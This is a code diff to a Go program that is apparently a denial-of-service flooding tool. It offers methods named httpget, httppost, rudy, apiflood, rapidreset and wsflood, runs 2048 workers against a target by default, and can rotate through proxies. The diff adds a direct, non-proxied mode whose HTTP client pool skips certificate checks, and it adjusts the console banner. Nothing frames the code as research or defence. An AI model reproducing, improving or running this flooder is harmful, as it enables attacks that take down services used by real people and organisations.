@@ -709,6 +709,42 @@ func buildClientPool(proxies []string) ([]*http.Client, error) {
 	return clients, nil
 }
 
+func buildDirectPool(count int) []*http.Client {
+	clients := make([]*http.Client, 0, count)
+	for i := 0; i < count; i++ {
+		c := &http.Client{
+			Transport: &http.Transport{
+				DialContext: (&net.Dialer{
+					Timeout:   5 * time.Second,
+					KeepAlive: 30 * time.Second,
+				}).DialContext,
+				TLSClientConfig: &tls.Config{
+					InsecureSkipVerify: true,
+					MinVersion:         tls.VersionTLS12,
+				},
+				TLSHandshakeTimeout:   5 * time.Second,
+				MaxIdleConns:          500,
+				MaxIdleConnsPerHost:   250,
+				MaxConnsPerHost:       250,
+				IdleConnTimeout:       90 * time.Second,
+				ResponseHeaderTimeout: 10 * time.Second,
+				DisableKeepAlives:     false,
+				DisableCompression:    true,
+				ForceAttemptHTTP2:     false,
+			},
+			Timeout: 10 * time.Second,
+			CheckRedirect: func(req *http.Request, via []*http.Request) error {
+				if len(via) >= 3 {
+					return http.ErrUseLastResponse
+				}
+				return nil
+			},
+		}
+		clients = append(clients, c)
+	}
+	return clients
+}
+
 func httpGet(url string, client *http.Client) error {
 	resp, err := client.Get(url)
 	if err != nil {
@@ -1319,7 +1355,7 @@ func main() {
 	method := flag.String("m", "httpget", "method: httpget, httppost, rudy, apiflood, rapidreset, wsflood")
 	workerCount := flag.Int("w", 2048, "number of workers")
 	dur := flag.Int("d", 30, "duration in seconds")
-	pFile := flag.String("p", "proxies.txt", "proxy file path")
+	pFile := flag.String("p", "", "proxy file path (optional, direct if omitted)")
 	flag.Parse()
 
 	if *target == "" {
@@ -1396,61 +1432,75 @@ func main() {
 	fmt.Printf(dim+"  │"+reset+" "+magenta+"METHOD"+reset+"   %-32s"+dim+"│"+reset+"\n", strings.ToUpper(*method))
 	fmt.Printf(dim+"  │"+reset+" "+yellow+"WORKERS"+reset+"  %-32d"+dim+"│"+reset+"\n", workers)
 	fmt.Printf(dim+"  │"+reset+" "+cyan+"DURATION"+reset+" %-32s"+dim+"│"+reset+"\n", fmt.Sprintf("%ds", duration))
-	fmt.Printf(dim+"  │"+reset+" "+green+"PROXIES"+reset+"  %-32s"+dim+"│"+reset+"\n", proxyFile)
+	proxyLabel := "DIRECT"
+	if proxyFile != "" {
+		proxyLabel = proxyFile
+	}
+	fmt.Printf(dim+"  │"+reset+" "+green+"PROXIES"+reset+"  %-32s"+dim+"│"+reset+"\n", proxyLabel)
 	fmt.Println(dim + "  └─────────────────────────────────────────┘" + reset)
 	fmt.Println()
 
-	// Loading animation — proxies
 	frames := []string{"⠋", "⠙", "⠹", "⠸", "⠼", "⠴", "⠦", "⠧", "⠇", "⠏"}
-	done := make(chan int)
-	go func() {
-		proxies, err := loadProxies(proxyFile)
-		if err != nil {
-			log.Fatalf(red + "  ✗ " + reset + "failed to load proxies: " + err.Error())
-		}
-		done <- len(proxies)
-	}()
 	spinIdx := 0
-	var proxyCount int
-spinLoop:
-	for {
-		select {
-		case proxyCount = <-done:
-			break spinLoop
-		default:
-			fmt.Printf("\r  %s%s%s Loading proxies...  ", yellow, frames[spinIdx%len(frames)], reset)
-			spinIdx++
-			time.Sleep(80 * time.Millisecond)
-		}
-	}
-	proxies, _ := loadProxies(proxyFile)
-	proxyList = proxies
-	fmt.Printf("\r  %s✓%s Loaded %s%d%s proxies                \n", green, reset, bold, proxyCount, reset)
 
-	// Loading animation — client pool
-	done2 := make(chan int)
-	go func() {
-		clients, err := buildClientPool(proxies)
-		if err != nil {
-			log.Fatalf(red + "  ✗ " + reset + "failed to build client pool: " + err.Error())
+	var clients []*http.Client
+
+	if proxyFile != "" {
+		// Proxied mode
+		done := make(chan int)
+		go func() {
+			proxies, err := loadProxies(proxyFile)
+			if err != nil {
+				log.Fatalf(red + "  ✗ " + reset + "failed to load proxies: " + err.Error())
+			}
+			done <- len(proxies)
+		}()
+		var proxyCount int
+	spinLoop:
+		for {
+			select {
+			case proxyCount = <-done:
+				break spinLoop
+			default:
+				fmt.Printf("\r  %s%s%s Loading proxies...  ", yellow, frames[spinIdx%len(frames)], reset)
+				spinIdx++
+				time.Sleep(80 * time.Millisecond)
+			}
 		}
-		done2 <- len(clients)
-	}()
-	spinIdx = 0
-	var clientCount int
-spinLoop2:
-	for {
-		select {
-		case clientCount = <-done2:
-			break spinLoop2
-		default:
-			fmt.Printf("\r  %s%s%s Building client pool...  ", yellow, frames[spinIdx%len(frames)], reset)
-			spinIdx++
-			time.Sleep(80 * time.Millisecond)
+		proxies, _ := loadProxies(proxyFile)
+		proxyList = proxies
+		fmt.Printf("\r  %s✓%s Loaded %s%d%s proxies                \n", green, reset, bold, proxyCount, reset)
+
+		done2 := make(chan int)
+		go func() {
+			c, err := buildClientPool(proxies)
+			if err != nil {
+				log.Fatalf(red + "  ✗ " + reset + "failed to build client pool: " + err.Error())
+			}
+			done2 <- len(c)
+		}()
+		spinIdx = 0
+		var clientCount int
+	spinLoop2:
+		for {
+			select {
+			case clientCount = <-done2:
+				break spinLoop2
+			default:
+				fmt.Printf("\r  %s%s%s Building client pool...  ", yellow, frames[spinIdx%len(frames)], reset)
+				spinIdx++
+				time.Sleep(80 * time.Millisecond)
+			}
 		}
+		clients, _ = buildClientPool(proxies)
+		fmt.Printf("\r  %s✓%s Built %s%d%s proxy clients            \n", green, reset, bold, clientCount, reset)
+	} else {
+		// Direct mode — no proxies
+		poolSize := 32
+		fmt.Printf("\r  %s✓%s Direct mode (no proxies)\n", green, reset)
+		clients = buildDirectPool(poolSize)
+		fmt.Printf("  %s✓%s Built %s%d%s direct clients            \n", green, reset, bold, poolSize, reset)
 	}
-	clients, _ := buildClientPool(proxies)
-	fmt.Printf("\r  %s✓%s Built %s%d%s proxy clients            \n", green, reset, bold, clientCount, reset)
 	fmt.Println()
 
 	// Countdown
